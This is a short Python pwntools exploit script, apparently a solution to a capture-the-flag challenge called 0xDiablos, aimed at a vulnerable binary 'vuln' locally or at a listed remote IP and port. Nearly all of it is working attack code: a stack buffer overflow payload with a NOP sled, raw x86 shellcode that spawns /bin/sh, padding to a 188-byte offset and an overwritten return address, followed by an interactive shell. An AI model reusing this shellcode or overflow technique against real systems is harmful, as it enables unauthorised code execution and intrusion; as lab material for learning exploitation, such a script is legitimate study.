#!/usr/bin/env python3

from pwn import *

# INSTANCE = 142.93.35.92:31486

host = "142.93.35.92"
port = 31486

program = "./vuln"
context.binary = program
binario = context.binary  

if(args['REMOTE']):
    s = remote(host, port)
else:
    s = process(program)

s.recvuntil('You know who are 0xDiablos:')

offset = 188

# BUFFER START = 0xff89eb80 + 0x6 = 0xff89eb86

#sc = asm(shellcraft.sh())

sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"

#payload = "A"*offset
#payload = "\xcc"*offset
#payload += p32(binario.symbols['main'])
#payload += "B"*4

payload = "\x90"*40
payload += sc
payload += "A"*(offset-40-len(sc))

# x/30wx $esp-0x100
payload += p32(0xffffd130) # next registro en pila

s.sendline(payload)
s.interactive()
